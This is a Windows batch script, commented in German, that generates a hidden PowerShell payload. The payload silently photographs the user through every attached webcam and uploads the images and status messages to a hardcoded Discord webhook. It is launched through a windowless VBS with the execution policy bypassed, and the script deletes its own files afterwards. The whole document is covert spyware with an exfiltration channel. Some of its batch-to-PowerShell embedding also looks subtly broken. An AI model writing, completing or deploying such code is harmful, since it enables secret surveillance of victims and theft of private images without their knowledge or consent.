@echo off
set "webhook=https://discord.com/api/webhooks/1469709535022420152/Fvmuq_82nWlMjj_KSV7mf-QnucQX7JyagCncSNPRnO56_-ywOdwI3hO7YcXJ7rTtapya"
set "ps=%temp%\camcapture.ps1"
set "vbs=%temp%\launcher.vbs"

REM ----- POWERSHELL SCRIPT MIT FEHLERBERICHT -----
(
$webhook = '%webhook%'
$tempDir = "$env:temp\camcapture_$(Get-Random)"
mkdir $tempDir -Force | Out-Null

# Funktion zum Senden von Nachrichten an Discord
function Send-DiscordMessage {
    param($Message)
    $payload = @{ content = $Message } | ConvertTo-Json
    Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body $payload -ErrorAction SilentlyContinue | Out-Null
}

try {
    # WinRT laden
    Add-Type -AssemblyName System.Runtime.WindowsRuntime
    [Windows.Devices.Enumeration.DeviceInformation,Windows.System.Devices,ContentType=WindowsRuntime] | Out-Null
    [Windows.Media.Capture.MediaCapture,Windows.Media.Capture,ContentType=WindowsRuntime] | Out-Null
    [Windows.Media.Capture.CameraCaptureUIMode,Windows.Media.Capture,ContentType=WindowsRuntime] | Out-Null
    [Windows.Media.MediaProperties.ImageEncodingProperties,Windows.Media,ContentType=WindowsRuntime] | Out-Null
    [Windows.Storage.StorageFile,Windows.Storage,ContentType=WindowsRuntime] | Out-Null
    [Windows.Storage.FileIO,Windows.Storage,ContentType=WindowsRuntime] | Out-Null

    # Kameras abrufen
    $cameraQuery = [Windows.Devices.Enumeration.DeviceInformation]::FindAllAsync([Windows.Devices.Enumeration.DeviceClass]::VideoCapture).GetAwaiter().GetResult()
    
    if ($cameraQuery.Count -eq 0) {
        Send-DiscordMessage "❌ Keine Kameras gefunden."
        Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
        exit
    }

    $photoCount = 0
    foreach ($device in $cameraQuery) {
        try {
            $mediaCapture = $null
            $stream = $null
            $file = $null
            
            $mediaCapture = New-Object Windows.Media.Capture.MediaCapture
            $settings = New-Object Windows.Media.Capture.MediaCaptureInitializationSettings
            $settings.VideoDeviceId = $device.Id
            $mediaCapture.InitializeAsync($settings).GetAwaiter().GetResult()

            $stream = New-Object Windows.Storage.Streams.InMemoryRandomAccessStream
            $encoding = [Windows.Media.MediaProperties.ImageEncodingProperties]::CreateJpeg()
            $mediaCapture.CapturePhotoToStreamAsync($encoding, $stream).GetAwaiter().GetResult()

            $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
            $cleanName = $device.Name -replace '[^a-zA-Z0-9]', '_'
            $filename = "$tempDir\${cleanName}_${timestamp}.jpg"
            
            $file = [Windows.Storage.StorageFile]::CreateStreamedFileAsync(
                $filename,
                {
                    param($request)
                    $request.WriteAsync($stream).GetAwaiter().GetResult()
                },
                $null
            ).GetAwaiter().GetResult()
            $stream.Dispose()
            $stream = $null

            # An Discord senden
            $boundary = [System.Guid]::NewGuid().ToString()
            $lf = "`r`n"
            $bodyBytes = [System.Text.Encoding]::UTF8.GetBytes(
                "--$boundary${lf}Content-Disposition: form-data; name=`"file`"; filename=`"$([System.IO.Path]::GetFileName($filename))`"${lf}Content-Type: image/jpeg${lf}${lf}"
            )
            $fileBytes = [System.IO.File]::ReadAllBytes($filename)
            $footerBytes = [System.Text.Encoding]::UTF8.GetBytes("${lf}--$boundary--${lf}")
            
            $payload = [byte[]]::new($bodyBytes.Length + $fileBytes.Length + $footerBytes.Length)
            $bodyBytes.CopyTo($payload, 0)
            $fileBytes.CopyTo($payload, $bodyBytes.Length)
            $footerBytes.CopyTo($payload, $bodyBytes.Length + $fileBytes.Length)
            
            $headers = @{ "Content-Type" = "multipart/form-data; boundary=$boundary" }
            Invoke-RestMethod -Uri $webhook -Method Post -Headers $headers -Body $payload -ErrorAction SilentlyContinue | Out-Null
            
            Remove-Item $filename -ErrorAction SilentlyContinue
            $photoCount++
        } catch {
            Send-DiscordMessage "⚠️ Fehler bei Kamera '$($device.Name)': $($_.Exception.Message)"
        } finally {
            if ($stream) { $stream.Dispose() }
            if ($file) { $file = $null }
            if ($mediaCapture) { $mediaCapture.Dispose() }
        }
    }
    
    Send-DiscordMessage "✅ $photoCount Foto(s) gesendet."
} catch {
    Send-DiscordMessage "❌ Schwerwiegender Fehler: $($_.Exception.Message)"
} finally {
    Remove-Item $tempDir -Recurse -Force -ErrorAction SilentlyContinue
}
) > "%ps%"

REM ----- VBS LAUNCHER (KEIN KONSOLENFENSTER) -----
(
echo Set objShell = CreateObject("Wscript.Shell")
echo objShell.Run "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File """ & ps & """", 0, False
echo Set objShell = Nothing
) > "%vbs%"
set "ps=%ps:\=\\%"
cscript //nologo "%vbs%"
timeout /t 2 /nobreak >nul
del "%ps%" "%vbs%" 2>nul
